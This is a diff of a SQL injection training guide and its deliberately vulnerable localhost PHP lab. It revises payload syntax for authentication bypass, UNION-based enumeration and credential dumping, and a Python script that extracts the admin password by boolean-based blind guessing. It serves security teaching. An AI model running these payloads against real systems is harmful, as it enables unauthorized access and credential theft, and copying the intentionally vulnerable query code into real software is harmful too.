 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Blind SQLi Challenge</title>
     <link rel="stylesheet" href="style.css">
+    <script src="script.js" defer></script>
 </head>
 <body>
     <div class="container">
         <header>
             <h1>Challenge 4: Blind SQL Injection</h1>
-            <p>No data is displayed — only whether the user exists or not</p>
+            <p>No sensitive data is displayed — only yes/no behavior and response timing</p>
         </header>
 
         <nav>
@@ -1272,7 +1605,7 @@ $execution_time = (microtime(true) - $start_time) * 1000;
         <main>
             <div class="info-box">
                 <h4>Objective</h4>
-                <p>The query only returns "User found" or "User not found". You cannot see the actual data. Use boolean-based blind SQLi to extract the admin's password character by character.</p>
+                <p>The query only returns "User found" or "User not found". Use boolean-based and time-based blind SQLi to infer the admin password character by character.</p>
                 <div class="query-box">SELECT * FROM users WHERE username = '$username'</div>
             </div>
 
@@ -1286,30 +1619,36 @@ $execution_time = (microtime(true) - $start_time) * 1000;
 
             <?php if ($query): ?>
                 <div class="result-box">
-                    <strong>Query executed (not shown to attacker):</strong>
+                    <strong>Query executed (trainer view):</strong>
                     <div class="query-box" style="opacity: 0.5;"><?php echo htmlspecialchars($query); ?></div>
+                </div>
+            <?php endif; ?>
+
+            <?php if ($query_error): ?>
+                <div class="error-box">
+                    <strong>Status:</strong> <?php echo htmlspecialchars($query_error); ?>
                 </div>
             <?php endif; ?>
 
             <?php if (isset($_GET['username'])): ?>
                 <?php if ($user_found): ?>
                     <div class="success-box">
-                        <strong><?php echo $message; ?></strong>
-                        <p style="margin-top: 10px; font-size: 0.85em; color: #666;">Response time: <?php echo number_format($execution_time, 0); ?>ms</p>
+                        <strong>User found.</strong>
+                        <p style="margin-top: 10px; font-size: 0.85em; color: #666;">Response time: <?php echo number_format((float) $execution_time, 0); ?>ms</p>
                     </div>
                 <?php else: ?>
                     <div class="error-box">
                         <strong>User not found.</strong>
-                        <p style="margin-top: 10px; font-size: 0.85em; color: #666;">Response time: <?php echo number_format($execution_time, 0); ?>ms</p>
+                        <p style="margin-top: 10px; font-size: 0.85em; color: #666;">Response time: <?php echo number_format((float) $execution_time, 0); ?>ms</p>
                     </div>
                 <?php endif; ?>
             <?php endif; ?>
 
             <div class="hint-box">
-                <strong>Hint:</strong> Try <code>admin' AND 1=1 -- </code> — this should show "User found" (true).
-                Try <code>admin' AND 1=2 -- </code> — this should show "User not found" (false).
+                <strong>Hint:</strong> Try <code>admin' AND 1=1 -- -</code> — this should show "User found" (true).
+                Try <code>admin' AND 1=2 -- -</code> — this should show "User not found" (false).
                 Now use this to guess the password character by character:
-                <code>admin' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a' -- </code>
+                <code>admin' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a' -- -</code>
             </div>
         </main>
 
@@ -1320,7 +1659,6 @@ $execution_time = (microtime(true) - $start_time) * 1000;
 </body>
 </html>
 ```
-
 ### 5.5 Running the Lab
 
 ```bash
@@ -1371,26 +1709,26 @@ sudo cp -r /path/to/sqli_lab /opt/lampp/htdocs/
 
 2. Better approach — comment out the password check:
    ```
-   Username: admin' --
+   Username: admin' -- -
    Password: anything
    ```
 
    Query becomes:
    ```sql
-   SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'anything'
+   SELECT * FROM users WHERE username = 'admin' -- -' AND password = 'anything'
    ```
 
-   The `--` comments out the rest. It just checks `WHERE username = 'admin'`.
+   The `-- -` comments out the rest. It just checks `WHERE username = 'admin'`.
 
 3. Even simpler — bypass entirely:
    ```
-   Username: ' OR 1=1 --
+   Username: ' OR 1=1 -- -
    Password: anything
    ```
 
    Query:
    ```sql
-   SELECT * FROM users WHERE username = '' OR 1=1 -- ' AND password = 'anything'
+   SELECT * FROM users WHERE username = '' OR 1=1 -- -' AND password = 'anything'
    ```
 
    This returns ALL users. The first one is usually admin.
@@ -1407,38 +1745,38 @@ sudo cp -r /path/to/sqli_lab /opt/lampp/htdocs/
 
 1. **Find the number of columns:**
    ```
-   Search: ' UNION SELECT 1,2,3,4 --
+   Search: ' UNION SELECT 1,2,3,4 -- -
    ```
    If 4 columns works, you see 1,2,3,4 as a result.
 
 2. **Find the database name:**
    ```
-   Search: ' UNION SELECT 1,database(),3,4 --
+   Search: ' UNION SELECT 1,database(),3,4 -- -
    ```
 
 3. **Find all tables:**
    ```
-   Search: ' UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema=database() --
+   Search: ' UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema=database() -- -
    ```
 
 4. **Find columns in the users table:**
    ```
-   Search: ' UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='users' --
+   Search: ' UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='users' -- -
    ```
 
 5. **Extract data:**
    ```
-   Search: ' UNION SELECT 1,username,password,4 FROM users --
+   Search: ' UNION SELECT 1,username,password,4 FROM users -- -
    ```
 
 6. **Concatenate for cleaner output:**
    ```
-   Search: ' UNION SELECT 1,CONCAT(username,':',password),3,4 FROM users --
+   Search: ' UNION SELECT 1,CONCAT(username,':',password),3,4 FROM users -- -
    ```
 
 **Expected result:** You see all usernames and their plaintext passwords.
 
-### Exercise 3: Error-Based Extraction
+### Exercise 3: Integer-Based UNION Extraction
 
 **Target:** `http://localhost/sqli_lab/product.php?id=1`
 
@@ -1478,31 +1816,31 @@ sudo cp -r /path/to/sqli_lab /opt/lampp/htdocs/
 
 1. **Confirm injection works (true condition):**
    ```
-   URL: user.php?username=admin' AND 1=1 --
+   URL: user.php?username=admin' AND 1=1 -- -
    ```
    Result: "User found"
 
 2. **Confirm injection works (false condition):**
    ```
-   URL: user.php?username=admin' AND 1=2 --
+   URL: user.php?username=admin' AND 1=2 -- -
    ```
    Result: "User not found"
 
 3. **Check password length:**
    ```
-   URL: user.php?username=admin' AND LENGTH((SELECT password FROM users WHERE username='admin'))=14 --
+   URL: user.php?username=admin' AND LENGTH((SELECT password FROM users WHERE username='admin'))=14 -- -
    ```
    Keep changing the number until you get "User found". Admin's password is `supersecret123` which is 14 characters.
 
 4. **Extract first character:**
    ```
-   URL: user.php?username=admin' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='s' --
+   URL: user.php?username=admin' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='s' -- -
    ```
    Result: "User found" (first char is 's')
 
 5. **Extract second character:**
    ```
-   URL: user.php?username=admin' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),2,1)='u' --
+   URL: user.php?username=admin' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),2,1)='u' -- -
    ```
    Result: "User found"
 
@@ -1520,7 +1858,7 @@ chars = string.ascii_lowercase + string.digits
 
 for pos in range(1, 20):
     for c in chars:
-        payload = f"admin' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),{pos},1)='{c}' -- "
+        payload = f"admin' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),{pos},1)='{c}' -- -"
         r = requests.get(url, params={"username": payload})
         if "User found" in r.text:
             password += c
@@ -1970,7 +2308,7 @@ The lab you built in Section 5 is your primary practice environment. Here's a su
 
 | Page | Vulnerability Type | What to Practice |
 |------|-------------------|------------------|
-| `login.php` | Authentication bypass | `' OR 1=1 --`, `admin' --` |
+| `login.php` | Authentication bypass | `' OR 1=1 -- -`, `admin' -- -` |
 | `search.php` | UNION-based SELECT | Column counting, data extraction |
 | `product.php` | Integer-based UNION | Version, user, secrets extraction |
 | `user.php` | Blind boolean-based | Password guessing character by character |
